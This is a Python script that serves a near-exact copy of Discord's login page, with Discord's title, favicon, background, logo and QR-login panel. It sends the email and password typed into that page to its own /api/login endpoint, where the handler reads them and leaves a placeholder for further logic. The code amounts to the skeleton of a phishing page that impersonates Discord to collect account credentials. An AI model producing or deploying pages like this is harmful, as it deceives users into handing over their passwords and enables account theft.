import os
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Discord</title>
  <link rel="icon" href="https://discord.com/assets/favicon.ico"/>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style>
    /* ── Reset ── */
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    html, body {
      height: 100%;
      font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
      line-height: 1;
      overflow: hidden;
      user-select: none;
    }

    /* ── Background ── */
    body {
      background: #5865f2;
    }
    .bg {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: 0;
    }

    /* ── Discord logo top-left ── */
    .logo {
      position: absolute;
      top: 24px;
      left: 24px;
      z-index: 2;
    }
    .logo svg {
      width: 124px;
      height: 24px;
    }

    /* ── Center wrapper ── */
    .page {
      height: 100vh;
      width: 100vw;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1;
    }

    /* ── Auth box ── */
    .authBox {
      background: #313338;
      width: 784px;
      padding: 32px;
      border-radius: 5px;
      display: flex;
      justify-content: flex-start;
      align-items: stretch;
      gap: 0;
      animation: fadeIn .3s ease;
      box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(.98); }
      to   { opacity: 1; transform: scale(1); }
    }

    /* ── Left: Form ── */
    .main-form {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding-right: 32px;
    }
    .main-form-header {
      display: flex;
      flex-direction: column;
      gap: 8px;
      justify-content: center;
      align-items: center;
      margin-bottom: 20px;
    }
    .main-form-header h1 {
      font-size: 24px;
      font-weight: 600;
      color: #f2f3f5;
      line-height: 1.25;
    }
    .main-form-header p {
      font-size: 16px;
      font-weight: 400;
      line-height: 20px;
      color: #b5bac1;
    }

    /* ── Form ── */
    form {
      display: flex;
      flex-direction: column;
    }
    .input-groups {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }
    .input-wrapper {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    .input-wrapper label {
      font-size: 12px;
      font-weight: 700;
      line-height: 16px;
      letter-spacing: .02em;
      text-transform: uppercase;
      color: #b5bac1;
    }
    .input-wrapper label .req {
      color: #f23f42;
      padding-left: 2px;
    }
    .input-wrapper input {
      width: 100%;
      height: 40px;
      padding: 10px;
      font-size: 16px;
      font-weight: 400;
      line-height: 22px;
      color: #dbdee1;
      background: #1e1f22;
      border: none;
      border-radius: 3px;
      outline: none;
      font-family: inherit;
      transition: border-color .15s ease;
    }
    .input-wrapper input:focus {
      outline: none;
    }

    /* ── Forgot password ── */
    .forgot-password {
      margin-top: 4px;
      margin-bottom: 20px;
    }
    .forgot-password a {
      font-size: 14px;
      font-weight: 400;
      color: #00a8fc;
      text-decoration: none;
    }
    .forgot-password a:hover {
      text-decoration: underline;
    }

    /* ── Login button ── */
    .login-btn-wrap {
      margin-bottom: 8px;
    }
    .login-btn-wrap button {
      width: 100%;
      height: 44px;
      background: rgb(88, 101, 242);
      color: #fff;
      border: none;
      border-radius: 3px;
      font-family: inherit;
      font-size: 16px;
      font-weight: 500;
      line-height: 24px;
      cursor: pointer;
      transition: background-color .17s ease;
    }
    .login-btn-wrap button:hover {
      background: rgb(71, 82, 196);
    }
    .login-btn-wrap button:active {
      background: rgb(60, 69, 165);
    }

    /* ── Need account ── */
    .small-register {
      display: flex;
      gap: 4px;
      margin-top: 4px;
    }
    .small-register span {
      color: #949ba4;
      font-size: 14px;
      font-weight: 400;
    }
    .small-register a {
      color: #00a8fc;
      font-size: 14px;
      font-weight: 400;
      text-decoration: none;
    }
    .small-register a:hover {
      text-decoration: underline;
    }

    /* ── Right: QR section ── */
    .right-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding-left: 32px;
      border-left: 1px solid #4e5058;
      min-width: 240px;
    }
    .qr-box {
      width: 176px;
      height: 176px;
      background: #fff;
      border-radius: 4px;
      padding: 8px;
      margin-bottom: 32px;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .qr-box canvas,
    .qr-box svg {
      width: 160px;
      height: 160px;
    }
    .qr-overlay {
      position: absolute;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      width: 48px; height: 48px;
      border-radius: 50%;
      background: #5865f2;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 0 0 4px #fff;
    }
    .qr-overlay svg {
      width: 28px;
      height: 28px;
    }
    .right-section h2 {
      font-size: 24px;
      font-weight: 600;
      color: #f2f3f5;
      line-height: 30px;
      margin-bottom: 8px;
    }
    .right-section p {
      font-size: 16px;
      font-weight: 400;
      color: #b5bac1;
      line-height: 20px;
      width: 240px;
      margin-bottom: 8px;
    }
    .right-section p strong {
      font-weight: 600;
    }
    .passkey-link {
      font-size: 14px;
      font-weight: 400;
      color: #00a8fc;
      text-decoration: none;
      margin-top: 8px;
    }
    .passkey-link:hover {
      text-decoration: underline;
    }

    /* ── Responsive ── */
    @media (max-width: 830px) {
      .authBox {
        flex-direction: column;
        max-width: 480px;
        width: 100%;
        margin: 0 16px;
      }
      .main-form { padding-right: 0; }
      .right-section { display: none; }
      .logo { display: none; }
    }
  </style>
</head>
<body>
  <!-- Background image -->
  <img class="bg" src="https://discord.com/assets/94ff6e56fff7ef4bbee2.svg" alt=""
       onerror="this.style.display='none';document.body.style.background='linear-gradient(135deg,#5865f2 0%,#3c45a5 50%,#5865f2 100%)'"/>

  <!-- Discord logo top-left -->
  <div class="logo">
    <svg viewBox="0 0 124 34" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.30193 14.1585 6.30193 11.8345 6.64292C11.6175 6.13144 11.2894 5.48048 11.0084 5C8.79015 5.37198 6.66475 6.03845 4.66935 6.9529C0.672399 12.8736 -0.411699 18.6548 0.130099 24.3585C2.79651 26.2959 5.36769 27.4739 7.89399 28.2489C8.51545 27.4149 9.07101 26.5308 9.55179 25.6018C8.65789 25.2672 7.80259 24.8569 6.99539 24.382C7.19779 24.2339 7.39619 24.0801 7.58979 23.9216C12.4229 26.1426 17.689 26.1426 22.4732 23.9216C22.6688 24.0801 22.8672 24.2339 23.0676 24.382C22.2584 24.8569 21.4031 25.2672 20.5072 25.6018C20.9899 26.5308 21.5435 27.4149 22.165 28.2489C24.6933 27.4739 27.2665 26.2959 29.9329 24.3585C30.5765 17.7559 28.8835 12.0305 26.0015 6.9529ZM10.0214 20.9937C8.54084 20.9937 7.33244 19.6457 7.33244 17.9931C7.33244 16.3406 8.51644 14.9906 10.0214 14.9906C11.5264 14.9906 12.7348 16.3386 12.7104 17.9931C12.7124 19.6457 11.5264 20.9937 10.0214 20.9937ZM20.0446 20.9937C18.564 20.9937 17.3556 19.6457 17.3556 17.9931C17.3556 16.3406 18.5396 14.9906 20.0446 14.9906C21.5496 14.9906 22.758 16.3386 22.7336 17.9931C22.7336 19.6457 21.5496 20.9937 20.0446 20.9937Z" fill="white"/>
      <path d="M42.4792 8.08567H49.7452C51.3172 8.08567 52.6822 8.36217 53.8402 8.91517C55.0002 9.46817 55.8882 10.2502 56.5082 11.2612C57.1282 12.2722 57.4382 13.4562 57.4382 14.8132C57.4382 16.1562 57.1282 17.3382 56.5082 18.3582C55.8882 19.3782 55.0002 20.1672 53.8402 20.7252C52.6822 21.2832 51.3172 21.5622 49.7452 21.5622H42.4792V8.08567ZM49.5372 18.7842C50.8942 18.7842 51.9712 18.3892 52.7692 17.5992C53.5672 16.8092 53.9652 15.7472 53.9652 14.4132C53.9652 13.0792 53.5672 12.0232 52.7692 11.2422C51.9712 10.4632 50.8942 10.0732 49.5372 10.0732H45.8832V18.7842H49.5372Z" fill="white"/>
      <path d="M60.4862 8.08567H63.8882V21.5622H60.4862V8.08567Z" fill="white"/>
      <path d="M70.5962 21.7862C69.4662 21.7862 68.4472 21.5452 67.5372 21.0612C66.6282 20.5782 65.9102 19.9032 65.3842 19.0362C64.8572 18.1702 64.5942 17.1672 64.5942 16.0282C64.5942 14.8752 64.8622 13.8672 65.3982 13.0052C65.9342 12.1432 66.6622 11.4732 67.5832 10.9952C68.5042 10.5172 69.5372 10.2782 70.6822 10.2782C71.5072 10.2782 72.2702 10.4062 72.9722 10.6622C73.6742 10.9182 74.2842 11.2872 74.8022 11.7692L73.3722 13.4892C72.5752 12.8052 71.7122 12.4622 70.7822 12.4622C69.9382 12.4622 69.2422 12.7282 68.6942 13.2622C68.1462 13.7952 67.8722 14.5502 67.8722 15.5282C67.8722 16.5062 68.1462 17.2642 68.6942 17.8022C69.2422 18.3412 69.9382 18.6102 70.7822 18.6102C71.7122 18.6102 72.5752 18.2672 73.3722 17.5832L74.8022 19.3032C74.2842 19.7852 73.6702 20.1542 72.9602 20.4102C72.2492 20.6612 71.4572 20.7862 70.5832 20.7862L70.5962 21.7862Z" fill="white"/>
      <path d="M84.4292 21.7862C83.2902 21.7862 82.2622 21.5452 81.3472 21.0612C80.4322 20.5782 79.7122 19.9032 79.1842 19.0362C78.6572 18.1702 78.3942 17.1672 78.3942 16.0282C78.3942 14.8892 78.6572 13.8862 79.1842 13.0192C79.7122 12.1522 80.4322 11.4772 81.3472 10.9942C82.2622 10.5112 83.2902 10.2702 84.4292 10.2702C85.5682 10.2702 86.5962 10.5112 87.5112 10.9942C88.4262 11.4772 89.1452 12.1522 89.6672 13.0192C90.1892 13.8862 90.4502 14.8892 90.4502 16.0282C90.4502 17.1672 90.1892 18.1702 89.6672 19.0362C89.1452 19.9032 88.4262 20.5782 87.5112 21.0612C86.5962 21.5452 85.5682 21.7862 84.4292 21.7862ZM84.4292 18.7842C85.2582 18.7842 85.9262 18.4982 86.4352 17.9262C86.9432 17.3532 87.1972 16.5782 87.1972 15.6002C87.1972 14.6222 86.9432 13.8512 86.4352 13.2852C85.9262 12.7192 85.2582 12.4372 84.4292 12.4372C83.6002 12.4372 82.9282 12.7192 82.4132 13.2852C81.8972 13.8512 81.6392 14.6222 81.6392 15.6002C81.6392 16.5782 81.8972 17.3532 82.4132 17.9262C82.9282 18.4982 83.6002 18.7842 84.4292 18.7842Z" fill="white"/>
      <path d="M97.3372 10.5022C97.9922 10.5022 98.5192 10.3252 98.9182 9.97117L99.8882 12.1922C99.4612 12.5122 98.9442 12.7442 98.3372 12.8892C97.7302 13.0342 97.1292 13.1062 96.5362 13.1062C95.2302 13.1062 94.2142 12.7502 93.4882 12.0382C92.7622 11.3262 92.3992 10.3112 92.3992 8.99317V5.97717H91.0602V10.4042H93.7202V12.7112H91.0602V21.5622H94.4622V12.7112H97.0142V10.4042H94.4622V9.22117C94.4622 8.77917 94.5802 8.43717 94.8152 8.19517C95.0512 7.95317 95.3792 7.83217 95.8002 7.83217C96.1222 7.83217 96.4382 7.88017 96.7482 7.97617L97.3372 10.5022Z" fill="white"/>
      <path d="M106.413 10.2782C107.509 10.2782 108.483 10.5232 109.337 11.0122C110.19 11.5022 110.859 12.1832 111.343 13.0562C111.827 13.9282 112.069 14.9422 112.069 16.0972C112.069 16.4402 112.049 16.7562 112.009 17.0452H103.289C103.416 17.8042 103.739 18.3972 104.257 18.8252C104.775 19.2522 105.429 19.4662 106.219 19.4662C106.781 19.4662 107.289 19.3702 107.743 19.1772C108.197 18.9842 108.612 18.6982 108.987 18.3202L110.737 20.1222C109.671 21.2322 108.163 21.7862 106.213 21.7862C105.019 21.7862 103.956 21.5452 103.023 21.0612C102.091 20.5782 101.363 19.9032 100.841 19.0362C100.319 18.1702 100.059 17.1672 100.059 16.0282C100.059 14.9032 100.315 13.9062 100.827 13.0362C101.339 12.1672 102.049 11.4892 102.957 11.0062C103.865 10.5222 104.89 10.2782 106.031 10.2782H106.413ZM106.189 12.5162C105.491 12.5162 104.907 12.7262 104.437 13.1472C103.967 13.5672 103.679 14.1252 103.575 14.8212H108.769C108.679 14.1252 108.399 13.5672 107.929 13.1472C107.459 12.7262 106.881 12.5162 106.189 12.5162Z" fill="white"/>
      <path d="M119.103 10.2702C119.893 10.2702 120.537 10.4452 121.037 10.7942L120.253 13.4282C119.837 13.1922 119.37 13.0742 118.853 13.0742C118.1 13.0742 117.477 13.3462 116.983 13.8892C116.489 14.4332 116.243 15.2032 116.243 16.2002V21.5622H112.841V10.5022H116.017V12.0842C116.353 11.4702 116.813 10.9832 117.395 10.6232C117.977 10.2622 118.614 10.0802 119.305 10.0802L119.103 10.2702Z" fill="white"/>
      <path d="M123.973 9.31317C123.381 9.31317 122.891 9.13717 122.503 8.78517C122.115 8.43317 121.921 7.99817 121.921 7.48017C121.921 6.96217 122.115 6.52717 122.503 6.17517C122.891 5.82317 123.381 5.64717 123.973 5.64717C124.565 5.64717 125.055 5.81817 125.443 6.16117C125.831 6.50317 126.025 6.93317 126.025 7.45117C126.025 7.98317 125.831 8.42717 125.443 8.78517C125.055 9.13717 124.565 9.31317 123.973 9.31317ZM122.271 10.5022H125.673V21.5622H122.271V10.5022Z" fill="white"/>
    </svg>
  </div>

  <div class="page">
    <div class="authBox">
      <!-- Left: Login form -->
      <div class="main-form">
        <div class="main-form-header">
          <h1>Welcome back!</h1>
          <p>We're so excited to see you again!</p>
        </div>

        <form id="loginForm" autocomplete="off">
          <div class="input-groups">
            <div class="input-wrapper">
              <label>EMAIL OR PHONE NUMBER <span class="req">*</span></label>
              <input type="text" id="email" name="email" required autocomplete="off"/>
            </div>
            <div class="input-wrapper">
              <label>PASSWORD <span class="req">*</span></label>
              <input type="password" id="password" name="password" required autocomplete="off"/>
            </div>
          </div>

          <div class="forgot-password">
            <a href="#">Forgot your password?</a>
          </div>

          <div class="login-btn-wrap">
            <button type="submit" id="loginBtn">Log In</button>
          </div>

          <div class="small-register">
            <span>Need an account?</span>
            <a href="#">Register</a>
          </div>
        </form>
      </div>

      <!-- Right: QR code -->
      <div class="right-section">
        <div class="qr-box">
          <!-- QR code pattern -->
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 37 37" shape-rendering="crispEdges">
            <rect width="37" height="37" fill="#fff"/>
            <path d="M0 0h7v1H0zM9 0h2v1H9zM12 0h4v1h-4zM19 0h2v1h-2zM22 0h2v1h-2zM27 0h3v1h-3zM30 0h7v1h-7z
M0 1h1v1H0zM6 1h1v1H6zM8 1h4v1H8zM16 1h3v1h-3zM20 1h2v1h-2zM23 1h4v1h-4zM28 1h1v1h-1zM30 1h1v1h-1zM36 1h1v1h-1z
M0 2h1v1H0zM2 2h3v1H2zM6 2h1v1H6zM8 2h2v1H8zM11 2h5v1h-5zM21 2h1v1h-1zM23 2h1v1h-1zM28 2h1v1h-1zM30 2h1v1h-1zM32 2h3v1h-3zM36 2h1v1h-1z
M0 3h1v1H0zM2 3h3v1H2zM6 3h1v1H6zM8 3h3v1H8zM12 3h1v1h-1zM14 3h4v1h-4zM20 3h1v1h-1zM23 3h3v1h-3zM28 3h1v1h-1zM30 3h1v1h-1zM32 3h3v1h-3zM36 3h1v1h-1z
M0 4h1v1H0zM2 4h3v1H2zM6 4h1v1H6zM9 4h2v1H9zM12 4h1v1h-1zM14 4h1v1h-1zM16 4h2v1h-2zM20 4h2v1h-2zM23 4h1v1h-1zM30 4h1v1h-1zM32 4h3v1h-3zM36 4h1v1h-1z
M0 5h1v1H0zM6 5h1v1H6zM11 5h2v1h-2zM17 5h1v1h-1zM24 5h3v1h-3zM30 5h1v1h-1zM36 5h1v1h-1z
M0 6h7v1H0zM8 6h1v1H8zM10 6h1v1h-1zM12 6h1v1h-1zM14 6h1v1h-1zM16 6h1v1h-1zM18 6h1v1h-1zM20 6h1v1h-1zM22 6h1v1h-1zM24 6h1v1h-1zM26 6h1v1h-1zM28 6h1v1h-1zM30 6h7v1h-7z
M8 7h1v1H8zM11 7h4v1h-4zM16 7h4v1h-4zM22 7h2v1h-2zM26 7h1v1h-1zM28 7h1v1h-1z
M0 8h1v1H0zM6 8h1v1H6zM8 8h1v1H8zM15 8h2v1h-2zM19 8h1v1h-1zM21 8h1v1h-1zM23 8h7v1h-7zM33 8h3v1h-3z
M0 9h1v1H0zM2 9h1v1H2zM10 9h1v1h-1zM12 9h3v1h-3zM16 9h1v1h-1zM18 9h1v1h-1zM24 9h1v1h-1zM29 9h4v1h-4zM35 9h1v1h-1z
M0 10h1v1H0zM2 10h3v1H2zM6 10h1v1H6zM8 10h4v1H8zM14 10h3v1h-3zM18 10h2v1h-2zM21 10h2v1h-2zM25 10h1v1h-1zM27 10h1v1h-1zM29 10h4v1h-4zM35 10h2v1h-2z
M1 11h4v1H1zM7 11h1v1H7zM9 11h1v1H9zM13 11h2v1h-2zM18 11h3v1h-3zM24 11h1v1h-1zM26 11h3v1h-3zM30 11h3v1h-3zM36 11h1v1h-1z
M0 12h5v1H0zM6 12h12v1H6zM21 12h1v1h-1zM24 12h1v1h-1zM27 12h2v1h-2zM30 12h2v1h-2zM36 12h1v1h-1z
M1 13h1v1H1zM8 13h5v1H8zM14 13h1v1h-1zM16 13h1v1h-1zM19 13h3v1h-3zM27 13h2v1h-2zM31 13h1v1h-1zM33 13h1v1h-1zM35 13h1v1h-1z
M2 14h2v1H2zM5 14h3v1H5zM11 14h1v1h-1zM14 14h3v1h-3zM18 14h1v1h-1zM20 14h1v1h-1zM22 14h1v1h-1zM25 14h1v1h-1zM27 14h1v1h-1zM31 14h3v1h-3zM36 14h1v1h-1z
M2 15h1v1H2zM5 15h1v1H5zM8 15h1v1H8zM10 15h2v1h-2zM13 15h1v1h-1zM16 15h1v1h-1zM19 15h1v1h-1zM21 15h3v1h-3zM27 15h5v1h-5zM33 15h3v1h-3z
M0 16h2v1H0zM3 16h4v1H3zM9 16h1v1H9zM11 16h2v1h-2zM15 16h1v1h-1zM18 16h1v1h-1zM20 16h12v1H20zM34 16h3v1h-3z
M1 17h4v1H1zM7 17h1v1H7zM11 17h1v1h-1zM14 17h1v1h-1zM16 17h1v1h-1zM21 17h1v1h-1zM25 17h1v1h-1zM28 17h2v1h-2zM31 17h1v1h-1zM34 17h2v1h-2z
M0 18h1v1H0zM4 18h3v1H4zM10 18h1v1h-1zM12 18h2v1h-2zM16 18h4v1h-4zM23 18h2v1h-2zM27 18h1v1h-1zM29 18h1v1h-1zM32 18h3v1h-3zM36 18h1v1h-1z
M3 19h2v1H3zM13 19h4v1h-4zM18 19h1v1h-1zM26 19h2v1h-2zM29 19h5v1h-5zM36 19h1v1h-1z
M1 20h1v1H1zM4 20h1v1H4zM6 20h2v1H6zM10 20h2v1h-2zM13 20h1v1h-1zM16 20h2v1h-2zM20 20h3v1h-3zM24 20h3v1h-3zM28 20h3v1h-3zM32 20h2v1h-2z
M0 21h2v1H0zM7 21h2v1H7zM10 21h2v1h-2zM13 21h6v1h-6zM22 21h6v1h-6zM29 21h1v1h-1zM32 21h1v1h-1zM34 21h1v1h-1zM36 21h1v1h-1z
M5 22h4v1H5zM12 22h2v1h-2zM15 22h3v1h-3zM21 22h1v1h-1zM25 22h1v1h-1zM27 22h7v1h-7zM35 22h2v1h-2z
M1 23h1v1H1zM3 23h3v1H3zM11 23h2v1h-2zM15 23h1v1h-1zM17 23h3v1h-3zM22 23h1v1h-1zM24 23h1v1h-1zM26 23h3v1h-3zM31 23h3v1h-3zM36 23h1v1h-1z
M0 24h3v1H0zM4 24h1v1H4zM6 24h1v1H6zM11 24h1v1h-1zM13 24h2v1h-2zM17 24h1v1h-1zM19 24h7v1h-7zM28 24h1v1h-1zM30 24h2v1h-2zM36 24h1v1h-1z
M0 25h1v1H0zM2 25h1v1H2zM5 25h1v1H5zM7 25h2v1H7zM12 25h3v1h-3zM17 25h2v1h-2zM20 25h1v1h-1zM22 25h2v1h-2zM25 25h1v1h-1zM28 25h1v1h-1zM31 25h1v1h-1zM34 25h1v1h-1z
M0 26h1v1H0zM3 26h1v1H3zM6 26h1v1H6zM10 26h3v1h-3zM15 26h2v1h-2zM18 26h2v1h-2zM21 26h2v1h-2zM24 26h1v1h-1zM26 26h2v1h-2zM30 26h2v1h-2zM35 26h2v1h-2z
M0 27h1v1H0zM2 27h1v1H2zM4 27h2v1H4zM8 27h2v1H8zM11 27h2v1h-2zM14 27h1v1h-1zM16 27h1v1h-1zM19 27h1v1h-1zM22 27h1v1h-1zM29 27h1v1h-1zM34 27h1v1h-1z
M0 28h1v1H0zM5 28h2v1H5zM8 28h2v1H8zM11 28h2v1h-2zM14 28h2v1h-2zM19 28h4v1h-4zM24 28h2v1h-2zM27 28h6v1h-6zM34 28h1v1h-1zM36 28h1v1h-1z
M8 29h3v1H8zM12 29h1v1h-1zM14 29h1v1h-1zM16 29h1v1h-1zM18 29h2v1h-2zM21 29h1v1h-1zM23 29h1v1h-1zM28 29h1v1h-1zM32 29h1v1h-1zM35 29h1v1h-1z
M0 30h7v1H0zM9 30h1v1H9zM14 30h2v1h-2zM17 30h3v1h-3zM23 30h2v1h-2zM28 30h1v1h-1zM30 30h1v1h-1zM32 30h1v1h-1zM36 30h1v1h-1z
M0 31h1v1H0zM6 31h1v1H6zM9 31h1v1H9zM12 31h1v1h-1zM14 31h1v1h-1zM16 31h1v1h-1zM20 31h2v1h-2zM23 31h2v1h-2zM26 31h3v1h-3zM32 31h1v1h-1zM35 31h1v1h-1z
M0 32h1v1H0zM2 32h3v1H2zM6 32h1v1H6zM12 32h3v1h-3zM18 32h5v1h-5zM24 32h7v1h-7zM32 32h1v1h-1zM34 32h1v1h-1z
M0 33h1v1H0zM2 33h3v1H2zM6 33h1v1H6zM9 33h4v1H9zM14 33h1v1h-1zM17 33h1v1h-1zM20 33h1v1h-1zM22 33h1v1h-1zM25 33h3v1h-3zM29 33h2v1h-2zM34 33h1v1h-1zM36 33h1v1h-1z
M0 34h1v1H0zM2 34h3v1H2zM6 34h1v1H6zM11 34h2v1h-2zM18 34h1v1h-1zM20 34h1v1h-1zM22 34h1v1h-1zM25 34h3v1h-3zM33 34h4v1h-4z
M0 35h1v1H0zM6 35h1v1H6zM10 35h1v1h-1zM12 35h2v1h-2zM15 35h2v1h-2zM23 35h2v1h-2zM26 35h1v1h-1zM28 35h2v1h-2zM32 35h2v1h-2zM36 35h1v1h-1z
M0 36h7v1H0zM8 36h1v1H8zM10 36h1v1h-1zM12 36h2v1h-2zM16 36h1v1h-1zM19 36h2v1h-2zM28 36h4v1h-4zM36 36h1v1h-1z" fill="#000"/>
          </svg>
          <!-- Discord logo overlay -->
          <div class="qr-overlay">
            <svg viewBox="0 0 28 20" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M23.7 1.68A23.1 23.1 0 0 0 17.98.01a.09.09 0 0 0-.09.04c-.25.44-.52.97-.72 1.41a21.3 21.3 0 0 0-6.4 0 14.6 14.6 0 0 0-.73-1.41.09.09 0 0 0-.09-.04c-2 .35-3.93.96-5.72 1.67a.08.08 0 0 0-.04.03C.67 7.72-.4 13.57.12 19.35a.1.1 0 0 0 .04.07 23.26 23.26 0 0 0 7.01 3.54.09.09 0 0 0 .1-.03 16.6 16.6 0 0 0 1.43-2.33.09.09 0 0 0-.05-.12 15.3 15.3 0 0 1-2.19-1.04.09.09 0 0 1-.01-.15c.15-.11.29-.22.43-.34a.09.09 0 0 1 .09-.01c4.6 2.1 9.57 2.1 14.12 0a.09.09 0 0 1 .1.01c.14.12.29.24.43.34a.09.09 0 0 1 0 .15c-.7.41-1.42.75-2.19 1.04a.09.09 0 0 0-.05.12c.42.81.9 1.59 1.43 2.33a.09.09 0 0 0 .1.04 23.18 23.18 0 0 0 7.02-3.55.1.1 0 0 0 .04-.06c.63-6.5-.99-12.14-4.3-17.14a.08.08 0 0 0-.04-.04zM9.35 15.88c-1.48 0-2.7-1.36-2.7-3.03s1.2-3.03 2.7-3.03c1.52 0 2.72 1.37 2.7 3.03 0 1.67-1.19 3.03-2.7 3.03zm9.97 0c-1.48 0-2.7-1.36-2.7-3.03s1.19-3.03 2.7-3.03c1.51 0 2.71 1.37 2.7 3.03-.01 1.67-1.2 3.03-2.7 3.03z" fill="#fff"/>
            </svg>
          </div>
        </div>
        <h2>Log in with QR Code</h2>
        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
        <a href="#" class="passkey-link">Or, sign in with a passkey</a>
      </div>
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();
      var btn = document.getElementById("loginBtn");
      btn.disabled = true;
      btn.innerHTML = '<span style="display:inline-flex;gap:4px;align-items:center;justify-content:center">' +
        '<span class="dot"></span><span class="dot"></span><span class="dot"></span></span>';
      var style = document.createElement("style");
      style.textContent = ".dot{width:6px;height:6px;background:#fff;border-radius:50%;animation:pulse 1.4s infinite ease-in-out;opacity:.3}.dot:nth-child(1){animation-delay:0s}.dot:nth-child(2){animation-delay:.2s}.dot:nth-child(3){animation-delay:.4s}@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(.8);opacity:.3}}";
      document.head.appendChild(style);

      try {
        var res = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: document.getElementById("email").value,
            password: document.getElementById("password").value
          })
        });
        var data = await res.json();
        console.log(data);
      } catch(err) {
        console.error(err);
      } finally {
        btn.innerHTML = "Log In";
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>"""


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(HTML.encode("utf-8"))

    def do_POST(self):
        if self.path == "/api/login":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            data = json.loads(body) if body else {}
            email = data.get("email", "")
            password = data.get("password", "")
            # TODO: add your own authentication logic here
            response = json.dumps({"status": "ok", "message": "Login endpoint reached"})
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(response.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        print(f"[{self.log_date_time_string()}] {format % args}")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    server = HTTPServer(("0.0.0.0", port), Handler)
    print(f"Server running on port {port}")
    server.serve_forever()
